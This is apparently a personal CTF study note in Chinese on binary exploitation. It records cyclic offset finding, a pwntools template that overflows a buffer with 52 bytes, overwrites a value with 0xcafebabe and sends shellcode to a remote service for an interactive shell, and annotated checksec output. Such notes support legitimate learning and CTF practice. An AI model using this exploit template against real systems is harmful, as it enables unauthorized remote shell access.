### Record some expolit of  payload.
因常常忘記...於是紀錄一下各種解題方法。

[Binary exploit 筆記](https://hackmd.io/GzDGwJgUwVgdgLQGYYBZGtAM0QTgEb5IKoAcWUAJsKcElPqUA===)

試bof字串：

```
>>> cyclic(52)

'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa'

>>> hex(0x21DD09EC - 0x10101010)

'0x11ccf9dc'

echo $((0x48-0x14))

52
```

#### pwntools起手式

```
#!/usr/bin/python 
# -*- coding: utf-8 -*-
from pwn import *
context.arch = "amd64"
# 0xcafebabe
r = remote('ip', port)

shell = asm(shellcraft.sh())

buf = p32(0xcafebabe)

payload = "A"*52
payload += buf
payload += shell

r.sendline(payload)

a = r.recvline().strip() # 接收回傳的字串
print a

r.interactive()
```

```
gdb-peda$ checksec
CANARY    : disabled //栈保护 
FORTIFY   : disabled //和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击
NX        : ENABLED  //DEP
PIE       : disabled //ASLR
RELRO     : Partial  //设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。
```
